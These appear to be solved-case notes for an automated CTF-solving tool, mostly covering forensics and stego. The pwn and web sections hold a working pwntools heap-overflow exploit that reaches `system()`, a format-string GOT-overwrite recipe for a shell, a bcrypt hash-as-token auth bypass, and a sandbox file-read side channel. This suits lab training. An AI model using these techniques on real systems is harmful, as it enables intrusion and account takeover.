SVIUSCG{stonehaven_glass_heron_stg_9f1a33}
```

Solver lesson:

- For Linux memory cases, confirm the kernel banner and symbol match before deeper plugins.
- Treat clean `psaux`, `envars`, `lsof`, and socket output as a clue to inspect VMA contents rather than as a dead end.
- Small anonymous `rwx` pages are high-signal; dump them first, then scan heap and stack if needed.

### JPEG-Appended Nintendo DS ROM Bitmap Text

Signal:

- `file` reports a normal JPEG, but the physical file continues well past the JPEG EOI marker `ff d9`.
- `strings` near the trailer shows a console-style title or game code, such as `USCG CTF` / `USCG01`.
- Carving from the trailer yields a valid Nintendo DS ROM image.

Reproduction:

```python
from pathlib import Path

data = Path("nintendo-ds.jpg").read_bytes()
eoi = data.index(b"\xff\xd9") + 2
tail = data[eoi:]
nds_start = tail.index(b"USCG CTF")
rom = tail[nds_start:]
Path("carved.nds").write_bytes(rom)
```

Then parse the NDS header to carve ARM9 code and reconstruct framebuffer writes:

```python
from pathlib import Path

rom = Path("carved.nds").read_bytes()
arm9_off = int.from_bytes(rom[0x20:0x24], "little")
arm9_size = int.from_bytes(rom[0x2c:0x30], "little")
arm9 = rom[arm9_off:arm9_off + arm9_size]

points = []
pos = 0
for i in range(4, len(arm9) - 4, 4):
    if arm9[i:i + 4] == bytes.fromhex("b060c3e1") and arm9[i - 3:i] == bytes.fromhex("3083e2"):
        pos += arm9[i - 4]
        points.append(pos // 2)
```

Render those points at a 256-pixel NDS screen width and split the first five rows into 4x5 bitmap glyphs. In the solved sample, the rendered text was:

```text
SVIUSCG{WHICH_EMULATOR_DID_YOU_USE?}
```

Solver lesson:

- Image forensics should report exact EOI and trailer offsets, then run `file`/`strings` on carved trailers.
- If a trailer is a ROM or firmware image, switch from stego extraction to format-aware reverse triage.
- ReverseSolver should recognize repeated `add pointer, immediate; store halfword` patterns as framebuffer drawing and generate a small renderer over likely screen widths such as 256 for Nintendo DS.

### JPEG COM Base64 Flag

Signal:

- JPEG has a comment marker (`COM`) or metadata field containing Base64-looking text.
- Direct flag scan fails because the flag appears only after decoding.

Reproduction:

```bash
exiftool image.jpg
strings -n 4 image.jpg
printf '%s' 'BASE64_TEXT' | base64 -d
```

Solver lesson:

- ForensicsSolver and MiscSolver should run transform candidates over image metadata, comments, text chunks, and trailing data.
- Write-up must say "found encoded text in JPEG COM comment, decoded with base64", not "strings directly showed the flag".

### PNG IHDR Height Repair

Signal:

- PNG viewer fails or image appears truncated.
- IHDR declared height does not match IDAT-derived scanline count, or CRC is wrong.

Reproduction strategy:

```bash
pngcheck image.png
python3 repair_ihdr_height.py image.png repaired.png
```

Solver lesson:

- MiscSolver and ForensicsSolver should compute plausible derived dimensions and write a repaired artifact path.

### PNG LSB Extraction

Signal:

- PNG appears normal but statement hints at hidden image data.
- LSB scan over RGB channels yields printable text or encoded entities.

Reproduction strategy:

- Try bit plane 1 first.
- Try RGB/RGBA channel orders and row-major traversal.
- Decode extracted text again if it is HTML entities, URL encoding, or Base64.

Solver lesson:

- Image evidence should record recipe details such as `b1,rgb,lsb,xy` so the write-up can be reproduced.

### Extra Or Independent PNG IDAT Payload

Signal:

- PNG has extra compressed chunks or zlib-looking data after the normal image stream.
- `binwalk` may not explain the payload.

Reproduction strategy:

- Parse PNG chunks.
- Try each independent IDAT/zlib stream with `zlib.decompress`.
- Scan decompressed text with transform candidates.

Solver lesson:

- ForensicsSolver should continue after normal PNG parsing and test independent compressed streams.

### Magic Extension Mismatch

Signal:

- Filename says `.jpg`, but magic bytes say PNG, ZIP, gzip, or another container.

Reproduction:

```bash
file artifact
xxd -l 16 artifact
```

Solver lesson:

- Solver routing should follow detected content, not extension. Reports should explicitly mention the mismatch.

### Krita Project Masquerading As ZIP

Signal:

- File extension is `.zip`, but `mimetype` inside says `application/x-krita`.
- Archive contains `maindoc.xml`, `mergedimage.png`, and `*.shapelayer/content.svg`.
- Hidden vector layers each contain one text character.

Reproduction:

```bash
unzip challenge.zip -d out
cat out/mimetype
find out -path '*shapelayer/content.svg' -print
```

Parse the SVG text nodes and sort by x coordinate:

```python
from pathlib import Path
import html, re

items = []
for path in Path("out").glob("**/*.shapelayer/content.svg"):
    text = path.read_text()
    m = re.search(r'<text[^>]*transform="([^"]+)"[^>]*>(.*?)</text>', text, re.S)
    if not m:
        continue
    nums = [float(x) for x in re.findall(r'-?\d+(?:\.\d+)?', m.group(1))]
    x = nums[-2] if m.group(1).startswith("matrix") else nums[0]
    ch = html.unescape(re.sub(r"<.*?>", "", m.group(2)).strip())
    items.append((x, ch))
print("".join(ch for _, ch in sorted(items)))
```

Solver lesson:

- MiscSolver should inspect ZIP `mimetype` entries for OpenDocument/Krita-like containers.
- SVG text extraction and coordinate sorting should be a reusable image/document subroutine.

### Pickle Sandbox Pattern

Signal:

- Misc attachment includes `pickle.loads` or `pickle.load`.
- Surrounding code mentions blacklist, sandbox, allowed globals, or opcode filtering.

Reproduction strategy:

- Do not run untrusted pickle payloads blindly.
- Read the blacklist and allowed opcodes.
- Build a local, controlled reproduction script that shows the bypass path.

Solver lesson:

- MiscSolver should classify the pattern and preserve source lines, even when it does not auto-execute payloads.

### Hash Triage Before Transforms

Signal:

- Text contains 32/40/64 hex strings, bcrypt, sha512crypt, NTLM-like values, or known hash prefixes.

Reproduction strategy:

```bash
hashid value
hashcat --help | rg "mode"
```

Solver lesson:

- CryptoSolver and MiscSolver should fingerprint likely hash modes and ask for bounded wordlist intent before running cracking tools.

## Pwn Cases

### Menu Binary With Stack Variable Overwrite And Heap Command Overwrite

Signal:

- ELF imports `system`.
- Full protections are enabled, but behavior is logic/heap-structure based rather than ROP based.
- Menu has a callsign/auth action, upload action, and diagnostics action.
- A stack `%s` write overwrites a nearby size variable.
- Upload reads that inflated size into a smaller heap chunk.
- Diagnostics calls `system(current_task)`.

Reproduction strategy:

1. Set the allowed buffer limit to the maximum valid value.
2. Use an overlong callsign: `b"A" * 16 + p32(80)` to change `TX_SZ`.
3. Upload `b"B" * 0x30 + b"cat flag.txt\x00"` to overflow into the task command.
4. Run diagnostics to execute `system(current_task)`.

Exploit skeleton:

```python
from pwn import *

io = process("./uplink")
# io = remote("host", port)
io.sendlineafter(b"buffer limit", b"31")
io.sendlineafter(b"cmd>", b"1")
io.sendlineafter(b"callsign:", b"A" * 16 + p32(80))
io.sendlineafter(b"cmd>", b"3")
io.sendafter(b"payload:", b"B" * 0x30 + b"cat flag.txt\x00")
io.sendlineafter(b"cmd>", b"4")
io.interactive()
```

Solver lesson:

- PwnSolver should not stop at checksec when symbols/imports are available.
- Record imported `system`, global heap pointers, menu actions, unsafe `%s`, and `read` sizes as structured evidence.
- For Mac/Apple Silicon, provide an amd64 container runner. Prefer `python:3.11-slim --platform linux/amd64` when Python is needed.

### CCTF pwn3 Format String Shell Path

Signal:

- 32-bit FTP-like service.
- Commands such as `put` and `get`.
- User-controlled file content is printed with `printf(content)`.
- GOT is writable or libc leak plus GOT overwrite is possible.

Reproduction strategy:

- Upload a payload that leaks `printf@got`.
- Resolve libc base.
- Use `fmtstr_payload` to overwrite `printf@got` with `system`.
- Upload `/bin/sh` and trigger `get`.

Solver lesson:

- PwnSolver write-ups for shell-oriented cases should output a full Python exploit script with local/remote mode, binary/libc configuration, and interaction.

### Ret2win Source Pattern

Signal:

- Source contains a win-like function.
- Unsafe input writes into a fixed-size stack buffer.

Reproduction strategy:

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(200))
PY
```

Solver lesson:

- PwnSolver should produce crash harness, cyclic offset instructions, target symbol, and a local/remote pwntools template.

### Format String Source Pattern

Signal:

- Source calls `printf(user_input)`, `fprintf(stream, user_input)`, or equivalent.

Reproduction strategy:

- Probe `%p` positions.
- Identify the offset for controlled bytes.
- Use `fmtstr_payload` only after target write and offset are known.

Solver lesson:

- PwnSolver should separate evidence collection from exploit writes and ask for explicit remote target scope.

## Networking Lessons

- If a CTF service connects but immediately closes with zero bytes, compare from another network path before assuming exploit failure.
- Proxy/VPN paths can break CTF infra even when `nc -vz` says the port is open.
- For deterministic services, split the solve into offline parts: ask the user for small transcripts such as encrypted flag plus all-zero ciphertext.
- Keep remote exploit scripts non-interactive first (`id`, `whoami`, `cat flag.txt`) before trying to hold a shell.

## Recent USCyberGames Hands-On Cases

These cases came from live user-provided targets and artifacts. Keep the exact flags as solved-case references, but convert the techniques into small local fixtures before adding solver coverage.

### Vertex 3D Labs: Encoded STL Backup

Category:

- Web-assisted forensics / 3D asset stego.

Signal:

- The page describes a 3D mesh processing server.
- Response headers leak `X-Archived-Path: /assets_production_system_v3/bak/file_backup.sys`.
- Page copy mentions Windows-native encoded backup blocks.
- The backup looks like a PEM certificate but is actually `certutil -encode` style Base64.

Shortest path:

```bash
curl -sS https://target/assets_production_system_v3/bak/file_backup.sys -o file_backup.sys
python3 - <<'PY'
from pathlib import Path
import base64
s = Path("file_backup.sys").read_text()
b64 = "".join(line.strip() for line in s.splitlines() if "CERTIFICATE" not in line and line.strip())
Path("model.stl").write_bytes(base64.b64decode(b64))
PY
```

Then render the binary STL from a top/orthographic view. The flag was visible as raised geometry:

```text
SVIBGR{n3v3r_d1sm1ss_th3_f1n3_4rts}
```

Solver lesson:

- WebSolver should preserve response headers and promote leaked archive paths.
- ForensicsSolver/MiscSolver should recognize PEM-wrapped data that decodes to `OpenSCAD Model`/binary STL.
- 3D assets need cheap visual render previews, especially top/front/side orthographic projections.

### Wire Text: Multi-Space Morse In A Familiar Rant

Category:

- Misc text stego / Morse transform.

Signal:

- Challenge mentions wire, silence/signal, "What hath God wrought", and four words.
- File text is a recognizable rant, but spacing between words is abnormal.
- Only 2, 3, and 4 spaces appear between tokens.

Shortest path:

```python
from pathlib import Path
import re

s = Path("wire.txt").read_text()
runs = [len(m.group()) for m in re.finditer(r" +", s)]

# 2 spaces = dot, 4 spaces = dash, 3 spaces = letter separator.
groups, cur = [], ""
for n in runs:
    if n == 3:
        groups.append(cur)
        cur = ""
    elif n == 2:
        cur += "."
    elif n == 4:
        cur += "-"
if cur:
    groups.append(cur)
```

Decoded text:

```text
SVIBGR.M0RS3_C0D3_1S_C00L$
```

Final flag:

```text
SVIBGR{M0RS3_C0D3_1S_C00L}
```

Solver lesson:

- Transform triage should include whitespace-run histograms, not only visible characters.
- If decoded Morse uses punctuation as delimiters and the statement gives a flag format, map the punctuation back to braces only after verifying the prefix/body.

### Souvenirs Postcard: JPEG FFD9 Appended ZIP

Category:

- Forensics / appended archive.

Signal:

- JPEG postcard has ordinary metadata and image content.
- `strings` reveals `postcards/*.txt` near the tail.
- `binwalk` shows a ZIP archive immediately after JPEG EOI `FFD9`.

Shortest path:

```bash
binwalk souvenirs.jpg
cp souvenirs.jpg souvenirs.zip
unzip souvenirs.zip -d out
cat out/postcards/04_oman.txt
```

Flag:

```text
SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}
```

Solver lesson:

- JPEG triage should always check bytes after the last `FFD9`.
- If a ZIP is appended, list entries first and rank text files by title/order rather than dumping binary noise.
- Write-up wording should explicitly say "copy/offset-extract the appended ZIP, then read the relevant entry".

### Notation Audio: Chord Bitmask ASCII

Category:

- Crypto / audio notation cipher.

Signal:

- WAV is ordinary mono PCM with no appended data, no useful `strings`, and no sample-LSB hit.
- The first section is a C-major scale up/down, then a C-major arpeggio. Treat that as a calibration header for note names.
- Silence detection shows the payload after the long pause is a sequence of equal-length events.
- Each payload event is a chord, not a monophonic note. The simultaneously present notes from `C D E F G A B` form a 7-bit ASCII mask.

Shortest path:

```python
import numpy as np
import soundfile as sf

y, sr = sf.read("notation.wav")
if y.ndim > 1:
    y = y[:, 0]
y = y.astype(float)

# Payload starts after the second long silence. The short silences split chords.
silences = [
    (7.322086, 8.100249), (8.396327, 8.480249), (8.775465, 8.860295),
    (9.158186, 9.240249), (9.537211, 9.620249), (9.916327, 10.000295),
    (10.295193, 10.380249), (10.676848, 10.760181), (11.057324, 11.140317),
    (11.437800, 11.520295), (11.817483, 11.900204), (12.198050, 12.280272),
    (12.577029, 12.660249), (12.956417, 13.040204), (13.337392, 13.420181),
    (13.717143, 13.800204), (14.098254, 14.180204), (14.477279, 14.560204),
    (14.857279, 14.940295), (15.237483, 15.320249), (15.617211, 15.700181),
    (15.997143, 16.080295), (16.377483, 16.460204), (16.757279, 16.840181),
    (17.137143, 17.220249), (17.517211, 17.601111), (17.897370, 17.981111),
    (18.277370, 18.360227), (18.658209, 18.740181), (19.038209, 19.119705),
]
windows = [(silences[i][1], silences[i + 1][0]) for i in range(len(silences) - 1)]

notes = [
    ("C", 261.625565), ("D", 293.664768), ("E", 329.627557),
    ("F", 349.228231), ("G", 391.995436), ("A", 440.0), ("B", 493.883301),
]

out = []
for start, end in windows:
    a, b = int((start + 0.03) * sr), int((end - 0.03) * sr)
    segment = y[a:b] - np.mean(y[a:b])
    segment *= np.hanning(len(segment))
    t = np.arange(len(segment)) / sr
    scores = []
    for name, freq in notes:
        wave = np.exp(-2j * np.pi * freq * t)
        scores.append((name, abs(np.dot(segment, wave)) ** 2))
    peak = max(score for _, score in scores)
    value = 0
    for bit, (name, score) in enumerate(scores):
        if score > peak * 0.65:
            value |= 1 << bit
    out.append(chr(value))

print("".join(out))
```

Decoded message:

```text
SVIUSCG{b1n4ry_mus1c_1s_c00l}
```

Final flag:

```text
SVIUSCG{b1n4ry_mus1c_1s_c00l}
```

Solver lesson:

- AudioSolver should distinguish monophonic melodies from chord events. If several calibrated note frequencies appear with similar energy in one time window, decode the event as a note-set bitmask.
- Music-themed audio tasks may use the first scale/arpeggio as a calibration header; use that order to assign bit positions.
- Before trying heavy stego, run silence detection, segment events, score the seven natural-note frequencies, and try C-to-B / B-to-C bit orders as 7-bit ASCII.

### Intern-Net: Client-Side Bcrypt Hash As Session Token

Category:

- Web auth logic / insecure client-side authentication.

Signal:

- Login page loads `bcrypt.min.js`.
- `/static/js/login.js` retrieves `/api/auth/hash`, verifies the password client-side, and sets `auth_token = base64(hash)`.
- Ordinary registration gives an intern account and reveals a locked Senior Intern announcement.
- Public posts mention `Alex Rivera`, the Senior Intern coordinator.

Shortest path:

```bash
curl -sS -X POST https://target/api/auth/hash \
  -H 'Content-Type: application/json' \
  -d '{"username":"alex.rivera"}'
```

Then Base64-encode the returned bcrypt hash and set it as the `auth_token` cookie before visiting `/announcements`.

Flag:

```text
SVIUSCG{8bb1e559044d7df7f3fac04d124b1e63}
```

Solver lesson:

- WebSolver should fetch same-origin auth JavaScript and flag client-side password verification, exposed hash lookup, and hash-as-token patterns.
- It should enumerate likely usernames only from in-scope page evidence such as author names and email addresses.
- Report the bug as auth bypass/IDOR-like token forgery, not password cracking.

### Lingual Janet: Sandbox Load-Order File Read Side Channel

Category:

- Web sandbox / language interpreter.

Status:

- Paused before full flag recovery, but the core primitive was verified.

Signal:

- Go server writes user Janet code to a temp file, then runs `janet sandbox.janet temp-file`.
- `sandbox.janet` executes `(dofile player-file)` before removing `dofile`, `require`, and `import`.
- Dangerous OS/network functions are removed, but `slurp`/`file/read` remain available.
- The flag path is provided as `/flag.txt`.
- Janet stdout is consumed by the game as move directions, so printing the flag does not appear directly in the HTTP response.

Verified primitive:

```janet
(def flag (slurp "/flag.txt"))
(defn move [state]
  :right)
```

This loaded successfully remotely, and a first side-channel attempt recovered the first byte `S`.

Planned shortest path:

- Read `/flag.txt` at Janet load time.
- Encode one bit or one comparison result per tick by returning `:left` or `:right`.
- Observe the first SSE frame or position changes from `/stream/<session_id>`.
- Prefer one long session that leaks many bits rather than many `/start` requests, because repeated TLS connections were unstable.

Solver lesson:

- WebSolver should parse provided server/source attachments for interpreter load order and sandbox removal timing.
- Sandbox cases need output-channel analysis: stdout, stderr, files, timing, game state, and SSE fields can all be exfiltration paths.
- Post-run Critic should record "read primitive works but output channel is consumed" as a blocker with a side-channel rerun plan.

## ForgeFlag Backlog From These Cases

- Add static JS fetch and comment/string extraction for same-origin scripts.
- Add public/private boolean API parameter hints for status/feed style web apps.
- Add image metadata transform decoding to both ForensicsSolver and MiscSolver.
- Add ZIP container subtype detection for Krita/OpenDocument style archives.
- Add SVG text coordinate extraction.
- Add certutil/PEM-wrapped binary decoding and STL orthographic render previews.
- Add whitespace-run stego analysis before generic text transforms.
- Add JPEG EOI appended ZIP extraction hints to image write-ups.
- Add Web auth JavaScript checks for exposed bcrypt hashes and hash-as-token cookies.
- Add sandbox source triage for interpreter load order, leftover file APIs, and side-channel output routes.
- Add CTR fixed nonce exploit script generation.
- Add modular matrix conjugation solve script generation.
- Improve PwnSolver deep triage: unsafe scanf, stack variable overwrite, heap chunk adjacency, imported `system`, and generated non-interactive command execution exploit.
- Improve report wording so write-ups describe exactly how the flag was recovered, not generic solver summaries.
